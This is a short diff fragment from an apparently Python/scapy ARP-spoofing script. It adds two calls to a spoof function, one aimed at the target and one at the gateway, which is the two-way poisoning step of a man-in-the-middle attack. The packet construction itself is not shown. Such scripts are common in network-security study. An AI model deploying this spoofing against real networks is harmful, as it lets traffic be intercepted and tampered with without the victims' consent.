@@ -18,3 +18,6 @@ def spoof(target_ip, spoof_ip):
     print(packet.show())
     print(packet.summary())
     scapy.send(packet)
+
+spoof(target_ip, gateway_ip)
+spoof(gateway_ip, target_ip)
